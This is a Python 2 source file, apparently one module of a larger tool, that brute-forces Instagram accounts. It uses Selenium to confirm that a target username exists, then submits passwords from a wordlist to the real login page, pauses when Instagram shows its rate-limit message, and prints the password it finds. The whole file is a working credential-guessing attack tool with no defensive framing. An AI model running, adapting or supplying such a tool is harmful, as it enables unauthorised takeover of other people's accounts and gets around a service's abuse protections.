# -*- coding: utf-8 -*-
from time import sleep
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
import sys
reload(sys)
sys.setdefaultencoding('utf8')

''' instagramLib.py - Instagram bruteforce, seperate from mainLib to prevent any errors.
                      Comprises of a username checking method and actual bruteforce method. '''

R = '\033[31m'  # red
W = '\033[0m'  # white (normal)
G = '\033[32m'  # green
O = '\033[33m'  # orange

timeout = "There was a problem logging you into Instagram. Please try again soon."

def instUserCheck(username):
    try:
        driver = webdriver.Firefox()
        driver.get("https://instagram.com/" + username)
        assert (("Sorry, this page isn't available.") not in driver.page_source)
        driver.close()
    except AssertionError:
        return 1

def instagramBruteforce(username, wordlist, delay):
    driver = webdriver.Firefox()
    driver.get("https://instagram.com/accounts/login")
    sleep(delay * 2)
    wordlist = open(wordlist, 'r')
    for i in wordlist.readlines():
        password = i.strip("\n")
        try:
            elem = driver.find_element_by_name("username")
            elem.clear()
            elem.send_keys(username)
            elem = driver.find_element_by_name("password")
            elem.clear()
            elem.send_keys(password)
            elem.send_keys(Keys.RETURN)

            if timeout in driver.page_source:
                print O + "[!] Timeout raised! Waiting... [!]" + W
                sleep(300)

            print O + "[*] Username: %s | [*] Password: %s | Incorrect!\n" % (username, password) + W
            sleep(delay)
            assert (("Login") in driver.title)
        except AssertionError:
            print G + "[*] Username: %s | [*] Password found: %s\n" % (username, password) + W
            sys.exit(0)
